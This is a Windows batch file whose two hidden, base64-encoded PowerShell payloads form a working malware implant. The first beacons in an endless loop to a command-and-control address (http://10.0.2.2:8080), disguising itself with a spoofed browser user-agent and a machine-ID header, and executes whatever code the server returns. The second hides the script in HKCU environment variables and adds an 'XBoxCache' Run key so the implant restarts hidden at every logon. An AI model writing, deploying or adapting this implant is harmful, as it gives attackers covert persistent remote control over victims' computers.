@echo off
set xwp0=powershell
set xwp1=-windowStyle
set xwp2=hidden
set xps1="ZgB1AG4AYwB0AGkAbwBuACAAZgAwACgAKQANAAoAewANAAoAIAAgACAAIAAkAHEAdQBlAHIAeQAgAD0AIAAiAHMAZQBsAGUAYwB0ACAAKgAgAGYAcgBvAG0AIAB3AGkAbgAzADIAXwBsAG8AZwBpAGMAYQBsAGQAaQBzAGsAIAB3AGgAZQByAGUAIABEAGUAdgBpAGMAZQBJAEQAPQAnAEMAOgAnACIAOwANAAoAIAAgACAAIAAkAHMAZQByAGkAYQBsAE4AdQBtAGIAZQByACAAPQAgACgARwBlAHQALQBXAG0AaQBPAGIAagBlAGMAdAAgAC0AUQB1AGUAcgB5ACgAJABxAHUAZQByAHkAKQApAC4AVgBvAGwAdQBtAGUAUwBlAHIAaQBhAGwATgB1AG0AYgBlAHIAOwANAAoAIAAgACAAIAAkAGMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAPQAgACQAZQBuAHYAOgBjAG8AbQBwAHUAdABlAHIAbgBhAG0AZQA7AA0ACgAgACAAIAAgACQAcwBoAGEAMgA1ADYAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFMAZQBjAHUAcgBpAHQAeQAuAEMAcgB5AHAAdABvAGcAcgBhAHAAaAB5AC4AUwBIAEEAMgA1ADYAXQA6ADoAQwByAGUAYQB0AGUAKAApAA0ACgAgACAAIAAgACQAaABhAHMAaABCAHkAdABlAHMAIAA9ACAAJABzAGgAYQAyADUANgAuAEMAbwBtAHAAdQB0AGUASABhAHMAaAAoAFsAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4ARQBuAGMAbwBkAGkAbgBnAF0AOgA6AFUAVABGADgALgBHAGUAdABCAHkAdABlAHMAKAAkAGMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACkAIAArACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AEIAeQB0AGUAcwAoACcAIAAnACAAKwAgACQAcwBlAHIAaQBhAGwATgB1AG0AYgBlAHIAKQApAA0ACgAgACAAIAAgACQAaABhAHMAaABCAHkAdABlAHMAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoAVABvAEIAYQBzAGUANgA0AFMAdAByAGkAbgBnACgAJABoAGEAcwBoAEIAeQB0AGUAcwApAA0ACgAgACAAIAAgAHIAZQB0AHUAcgBuACAAJABoAGEAcwBoAEIAeQB0AGUAcwANAAoAfQANAAoADQAKAGQAbwB7AA0ACgAgACAAIAAgACMAIABVAFIATAAgAGEAZABkAHIAZQBzAHMAIABvAGYAIAB0AGgAZQAgAEMAMgANAAoAIAAgACAAIAAkAHUAcgBsACAAPQAgACIAaAB0AHQAcAA6AC8ALwAxADAALgAwAC4AMgAuADIAOgA4ADAAOAAwACIADQAKACAAIAAgACAADQAKACAAIAAgACAAJABNAGkAbgBTAGUAYwBvAG4AZABzACAAPQAgADUADQAKACAAIAAgACAAJABNAGEAeABTAGUAYwBvAG4AZABzACAAPQAgADEAMAANAAoAIAAgACAAIAANAAoAIAAgACAAIAAkAHIAYQBuAGQAbwBtAEQAZQBsAGEAeQAgAD0AIABHAGUAdAAtAFIAYQBuAGQAbwBtACAALQBNAGkAbgBpAG0AdQBtACAAJABNAGkAbgBTAGUAYwBvAG4AZABzACAALQBNAGEAeABpAG0AdQBtACAAKAAkAE0AYQB4AFMAZQBjAG8AbgBkAHMAIAArACAAMQApAA0ACgAgACAAIAAgACQAYwBvAG0AcAB1AHQAZQByAEkAZAAgAD0AIABmADAADQAKACAAIAAgACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAAJAByAGEAbgBkAG8AbQBEAGUAbABhAHkADQAKAA0ACgAgACAAIAAgACQAdQBzAGUAcgBBAGcAZQBuAHQAIAA9ACAAJwBNAG8AegBpAGwAbABhAC8ANQAuADAAIAAoAFcAaQBuAGQAbwB3AHMAIABOAFQAIAAxADAALgAwADsAIABXAGkAbgA2ADQAOwAgAHgANgA0ADsAIAByAHYAOgAxADAAOQAuADAAKQAgAEcAZQBjAGsAbwAvADIAMAAxADAAMAAxADAAMQAgAEYAaQByAGUAZgBvAHgALwAxADEANgAuADAAJwA7AA0ACgANAAoAIAAgACAAIAAkAHcAZQBiAEMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAOwANAAoAIAAgACAAIAAkAHcAZQBiAEMAbABpAGUAbgB0AC4ASABlAGEAZABlAHIAcwBbACcAVQBzAGUAcgAtAEEAZwBlAG4AdAAnAF0AIAA9ACAAJAB1AHMAZQByAEEAZwBlAG4AdAA7AA0ACgAgACAAIAAgACQAdwBlAGIAQwBsAGkAZQBuAHQALgBIAGUAYQBkAGUAcgBzAC4AQQBkAGQAKAAnAEEAYwBjAGUAcAB0ACcALAAgACcAdABlAHgAdAAvAGgAdABtAGwALABhAHAAcABsAGkAYwBhAHQAaQBvAG4ALwB4AGgAdABtAGwAKwB4AG0AbAAsAGEAcABwAGwAaQBjAGEAdABpAG8AbgAvAHgAbQBsADsAcQA9ADAALgA5ACwAaQBtAGEAZwBlAC8AYQB2AGkAZgAsAGkAbQBhAGcAZQAvAHcAZQBiAHAALAAqAC8AKgA7AHEAPQAwAC4ANQAnACkAOwANAAoAIAAgACAAIAAkAHcAZQBiAEMAbABpAGUAbgB0AC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBBAGMAYwBlAHAAdAAtAEwAYQBuAGcAdQBhAGcAZQAnACwAIAAnAGUAbgAtAFUAUwA7AHEAPQAwAC4ANQAsAGUAbgA7AHEAPQAwAC4AMwAnACkAOwANAAoAIAAgACAAIAAkAHcAZQBiAEMAbABpAGUAbgB0AC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBVAHAAZwByAGEAZABlAC0ASQBuAHMAZQBjAHUAcgBlAC0AUgBlAHEAdQBlAHMAdABzACcALAAgACcAMQAnACkAOwANAAoAIAAgACAAIAAkAHcAZQBiAEMAbABpAGUAbgB0AC4ASABlAGEAZABlAHIAcwAuAEEAZABkACgAJwBYAC0AQwBvAG8AawBpAGUAJwAsACAAJABjAG8AbQBwAHUAdABlAHIASQBkACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAA0ACgAgACAAIAAgACMAIABJAG4AdgBvAGsAZQAgAHQAaABlACAARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACAAbQBlAHQAaABvAGQAIAB0AG8AIABmAGUAdABjAGgAIABkAGEAdABhACAAZgByAG8AbQAgAHQAaABlACAAVQBSAEwADQAKACAAIAAgACAAJABtAGUAdABoACAAPQAgACQAdwBlAGIAQwBsAGkAZQBuAHQALgBHAGUAdABUAHkAcABlACgAKQAuAEcAZQB0AE0AZQB0AGgAbwBkAHMAKAApACAAfAAgAFcAaABlAHIAZQAtAE8AYgBqAGUAYwB0ACAAewAgACQAXwAuAE4AYQBtAGUAIAAtAGUAcQAgACcARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACcAIAB9ACAAfAAgAFMAZQBsAGUAYwB0AC0ATwBiAGoAZQBjAHQAIAAtAEYAaQByAHMAdAAgADEADQAKACAAIAAgACAAdAByAHkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAJAByAGUAcwBwACAAPQAgACQAbQBlAHQAaAAuAEkAbgB2AG8AawBlACgAJAB3AGUAYgBDAGwAaQBlAG4AdAAsACAAQAAoACQAdQByAGwAKQApADsADQAKACAAIAAgACAAIAAgACAAIABJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIAZQBzAHAADQAKACAAIAAgACAAfQANAAoAIAAgACAAIABjAGEAdABjAGgAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIwAgAGQAbwAgAG4AbwB0AGgAaQBuAGcADQAKACAAIAAgACAAfQANAAoADQAKAH0AIAB3AGgAaQBsAGUAKAAkAHQAcgB1AGUAKQA7AA=="
cmd /c start /min "" %xwp0% %xwp1% %xwp2% -c (%xwp0% %xwp1% %xwp2% -enC ($env:xps1))
set xps2="ZABvACAAewANAAoAIAAgACAAIAAkAHAAcwBTAGMAcgBpAHAAdAAgAD0AIAAkAGUAbgB2ADoAeABwAHMAMQA7AA0ACgAgACAAIAAgACQAcgBlAGcAVgBhAGwAdQBlAE4AYQBtAGUAIAA9ACAAIgBYAEIAbwB4AEQAIgA7AA0ACgAgACAAIAAgACQAcgBlAGcAVgBhAGwAdQBlAEEAdQB0AG8AUgB1AG4ATgBhAG0AZQAgAD0AIAAiAFgAQgBvAHgAQwBhAGMAaABlACIAOwANAAoADQAKACAAIAAgACAAZgB1AG4AYwB0AGkAbwBuACAAZgAwACgAJABmAGEAcgBnAHMAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAGMAbwBuAHQAZQBuAHQAIAA9ACAAJABmAGEAcgBnAHMAWwAwAF0AOwANAAoAIAAgACAAIAAgACAAIAAgACQAYwBoAHUAbgBrAFMAaQB6AGUAIAA9ACAAJABmAGEAcgBnAHMAWwAxAF0AOwANAAoAIAAgACAAIAAgACAAIAAgACQAYwBoAHUAbgBrAEwAaQBzAHQAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEMAbwBsAGwAZQBjAHQAaQBvAG4AcwAuAEcAZQBuAGUAcgBpAGMALgBMAGkAcwB0AFsAcwB0AHIAaQBuAGcAXQBdADoAOgBuAGUAdwAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgACQAdABtAHAAUwB0AHIAIAA9ACAAJwAnADsADQAKACAAIAAgACAAIAAgACAAIAAkAGMAbwBuAHQAZQBuAHQAQwBoAGEAcgBzACAAPQAgACQAYwBvAG4AdABlAG4AdAAuAFQAbwBDAGgAYQByAEEAcgByAGEAeQAoACkAOwANAAoAIAAgACAAIAAgACAAIAAgAGYAbwByACAAKAAkAGkAIAA9ACAAMAA7ACQAaQAgAC0AbAB0ACAAJABjAG8AbgB0AGUAbgB0AEMAaABhAHIAcwAuAEwAZQBuAGcAdABoADsAJABpACsAKwApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB0AG0AcABTAHQAcgAgACsAPQAgACQAYwBvAG4AdABlAG4AdABDAGgAYQByAHMAWwAkAGkAXQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAdABtAHAAUwB0AHIALgBMAGUAbgBnAHQAaAAgAC0AZQBxACAAJABjAGgAdQBuAGsAUwBpAHoAZQApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAaAB1AG4AawBMAGkAcwB0AC4AQQBkAGQAKAAkAHQAbQBwAFMAdAByACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHQAbQBwAFMAdAByACAAPQAgACcAJwA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAfQBpAGYAIAAoACQAdABtAHAAUwB0AHIALgBMAGUAbgBnAHQAaAAgAC0AbgBlACAAMAApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABjAGgAdQBuAGsATABpAHMAdAAuAEEAZABkACgAJAB0AG0AcABTAHQAcgApADsADQAKACAAIAAgACAAIAAgACAAIAB9AHIAZQB0AHUAcgBuACAAJABjAGgAdQBuAGsATABpAHMAdAAuAFQAbwBBAHIAcgBhAHkAKAApADsADQAKACAAIAAgACAAfQANAAoACQANAAoAIAAgACAAIABmAHUAbgBjAHQAaQBvAG4AIABmADEAKAAkAGYAYQByAGcAcwApACAAewANAAoAIAAgACAAIAAgACAAIAAgACQAcgBlAGcASwBlAHkAIAA9ACAAJABmAGEAcgBnAHMAWwAwAF0ADQAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBnAE4AYQBtAGUAIAA9ACAAJABmAGEAcgBnAHMAWwAxAF0ADQAKACAAIAAgACAAIAAgACAAIAB0AHIAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcgBlAGcAUAByAG8AcABzACAAPQAgAEcAZQB0AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHIAZQBnAEsAZQB5AA0ACgAgACAAIAAgACAAIAAgACAAfQAgAGMAYQB0AGMAaAAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEUAcgByAG8AcgAgAGEAYwBjAGUAcwBzAGkAbgBnACAAcgBlAGcAaQBzAHQAcgB5ACAAawBlAHkAOgAgACQAXwAiAA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgACQAZgBhAGwAcwBlAA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJAByAGUAZwBQAHIAbwBwAHMALgBQAFMATwBiAGoAZQBjAHQALgBQAHIAbwBwAGUAcgB0AGkAZQBzAC4ATgBhAG0AZQAgAC0AYwBvAG4AdABhAGkAbgBzACAAJAByAGUAZwBOAGEAbQBlACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgACQAdAByAHUAZQANAAoAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgACQAZgBhAGwAcwBlAA0ACgAgACAAIAAgAH0ADQAKAAkADQAKAAkAZgB1AG4AYwB0AGkAbwBuACAAZgAyACgAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBnAEUAbgB2AFAAYQB0AGgAIAA9ACAAIgBIAEsAQwBVADoAXABFAG4AdgBpAHIAbwBuAG0AZQBuAHQAIgA7AA0ACgAgACAAIAAgACAAIAAgACAAJAByAGUAZwBBAHUAdABvAFIAdQBuAFAAYQB0AGgAIAA9ACAAIgBIAEsAQwBVADoAXABTAE8ARgBUAFcAQQBSAEUAXABNAGkAYwByAG8AcwBvAGYAdABcAFcAaQBuAGQAbwB3AHMAXABDAHUAcgByAGUAbgB0AFYAZQByAHMAaQBvAG4AXABSAHUAbgAiADsADQAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBnAEkAdABlAG0ATgBhAG0AZQBQAHIAZQBmAGkAeAAgAD0AIAAkAHIAZQBnAFYAYQBsAHUAZQBOAGEAbQBlADsADQAKACAAIAAgACAAIAAgACAAIAAkAHIAZQBnAEkAdABlAG0ATgBhAG0AZQBBAHUAdABvAFIAdQBuACAAPQAgACQAcgBlAGcAVgBhAGwAdQBlAEEAdQB0AG8AUgB1AG4ATgBhAG0AZQA7AA0ACgAgACAAIAAgACAAIAAgACAAJABwAHMAUgB1AG4AQwBtAGQAIAA9ACAAIgBwAG8AdwBlAHIAcwBoAGUAbABsACAALQB3AGkAbgBkAG8AdwBTAHQAeQBsAGUAIABoAGkAZABkAGUAbgAiADsADQAKACAAIAAgACAAIAAgACAAIAAkAGMAaAB1AG4AawBTAGkAegBlACAAPQAgADIAMAAzADkAOwANAAoAIAAgACAAIAAgACAAIAAgAFsAcwB0AHIAaQBuAGcAWwBdAF0AJABjAGgAdQBuAGsAcwAgAD0AIABmADAAKAAkAHAAcwBTAGMAcgBpAHAAdAAsACAAJABjAGgAdQBuAGsAUwBpAHoAZQApADsADQAKACAAIAAgACAAIAAgACAAIAANAAoAIAAgACAAIAAgACAAIAAgAGYAbwByACAAKAAkAGkAIAA9ACAAMQA7ACQAaQAgAC0AbAB0ACAAMgAwADQAOAA7ACQAaQArACsAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAdgBhAGwATgBhAG0AZQAgAD0AIAAoACQAcgBlAGcASQB0AGUAbQBOAGEAbQBlAFAAcgBlAGYAaQB4ACAAKwAgACQAaQAuAFQAbwBTAHQAcgBpAG4AZwAoACkAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGkAcwBFAHgAaQBzAHQAUgBlAGMAbwByAGQAIAA9ACAAZgAxACgAJAByAGUAZwBFAG4AdgBQAGEAdABoACwAIAAkAHYAYQBsAE4AYQBtAGUAKQA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAaQBzAEUAeABpAHMAdABSAGUAYwBvAHIAZAApACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB0AHIAeQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAuAFIAZQBtAG8AdgBlAC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkALQBOAGEAbQBlACgAJAByAGUAZwBJAHQAZQBtAE4AYQBtAGUAUAByAGUAZgBpAHgAIAArACAAJABpAC4AVABvAFMAdAByAGkAbgBnACgAKQApAC0AUABhAHQAaAAgACQAcgBlAGcARQBuAHYAUABhAHQAaAA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAYwBhAHQAYwBoACAAewANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGUAbABzAGUAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawA7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgAA0ACgAJAAkAJABhAHUAdABvAFIAdQBuAEMAbwBtAG0AYQBuAGQAIAA9ACAAJwAnADsADQAKACAAIAAgACAAIAAgACAAIABmAG8AcgAgACgAJABpACAAPQAgADAAOwAkAGkAIAAtAGwAdAAgACQAYwBoAHUAbgBrAHMALgBMAGUAbgBnAHQAaAA7ACQAaQArACsAKQAgAHsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAbgBhAG0AZQAgAD0AIAAkAHIAZQBnAEkAdABlAG0ATgBhAG0AZQBQAHIAZQBmAGkAeAAgACsAIAAoACQAaQAgACsAIAAxACkALgBUAG8AUwB0AHIAaQBuAGcAKAApADsADQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAE4AZQB3AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHIAZQBnAEUAbgB2AFAAYQB0AGgAIAAtAE4AYQBtAGUAIAAkAG4AYQBtAGUAIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAJwBTAHQAcgBpAG4AZwAnACAALQBWAGEAbAB1AGUAIAAkAGMAaAB1AG4AawBzAFsAJABpAF0AIAAtAEYAbwByAGMAZQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABhAHUAdABvAFIAdQBuAEMAbwBtAG0AYQBuAGQAIAArAD0AIAAoACcAJABlAG4AdgA6ACcAIAArACAAJABuAGEAbQBlACkAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGkAIAAtAGwAdAAgACQAYwBoAHUAbgBrAHMALgBMAGUAbgBnAHQAaAAgAC0AIAAxACkAIAB7AA0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYQB1AHQAbwBSAHUAbgBDAG8AbQBtAGEAbgBkACAAKwA9ACAAJwArACcAOwANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQANAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAADQAKACAAIAAgACAAIAAgACAAIAB9AA0ACgAgACAAIAAgACAAIAAgACAADQAKAAkACQAkAGEAdQB0AG8AUgB1AG4AQwBvAG0AbQBhAG4AZAAgAD0AIAAnACgAJwAgACsAIAAkAGEAdQB0AG8AUgB1AG4AQwBvAG0AbQBhAG4AZAAgACsAIAAnACkAJwA7AA0ACgAgACAAIAAgACAAIAAgACAAJAB0AGUAbQBsAGEAdABlAFIAZQBjAG8AcgBkACAAPQAgACcAYwBtAGQAIAAvAGMAIABzAHQAYQByAHQAIAAvAG0AaQBuACAAIgAiACAAJwAgACsAIAAkAHAAcwBSAHUAbgBDAG0AZAAgACsAIAAnACAALQBjACgAJwAgACsAIAAkAHAAcwBSAHUAbgBDAG0AZAAgACsAIAAnACAALQBlAG4AQwAoACQAZQBuAHYAOgB4AHgAeAB2AHgAeAB4ACkAKQAnADsADQAKACAAIAAgACAAIAAgACAAIAAkAGEAdQB0AG8AUgB1AG4AUgBlAGMAbwByAGQAIAA9ACAAJAB0AGUAbQBsAGEAdABlAFIAZQBjAG8AcgBkAC4AUgBlAHAAbABhAGMAZQAoACcAKAAkAGUAbgB2ADoAeAB4AHgAdgB4AHgAeAApACcALAAgACQAYQB1AHQAbwBSAHUAbgBDAG8AbQBtAGEAbgBkACkAOwANAAoAIAAgACAAIAAgACAAIAAgAE4AZQB3AC0ASQB0AGUAbQBQAHIAbwBwAGUAcgB0AHkAIAAtAFAAYQB0AGgAIAAkAHIAZQBnAEEAdQB0AG8AUgB1AG4AUABhAHQAaAAgAC0ATgBhAG0AZQAgACQAcgBlAGcASQB0AGUAbQBOAGEAbQBlAEEAdQB0AG8AUgB1AG4AIAAtAFAAcgBvAHAAZQByAHQAeQBUAHkAcABlACAAJwBTAHQAcgBpAG4AZwAnACAALQBWAGEAbAB1AGUAIAAkAGEAdQB0AG8AUgB1AG4AUgBlAGMAbwByAGQAIAAtAEYAbwByAGMAZQANAAoADQAKACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgADAAOwANAAoAIAAgACAAIAB9AA0ACgAJAA0ACgAJACQAcgAgAD0AIABmADIAOwANAAoAIAAgACAAIABXAHIAaQB0AGUALQBPAHUAdABwAHUAdAAoACcAXwBtADAAMwB0AHMAZgBjADoAIAAnACAAKwAgACQAcgApADsADQAKAH0AdwBoAGkAbABlACAAKAAkAGYAYQBsAHMAZQApADsADQAKACAAIAAgACAA"
cmd /c start /min "" %xwp0% %xwp1% %xwp2% -c (%xwp0% %xwp1% %xwp2% -enC ($env:xps2))
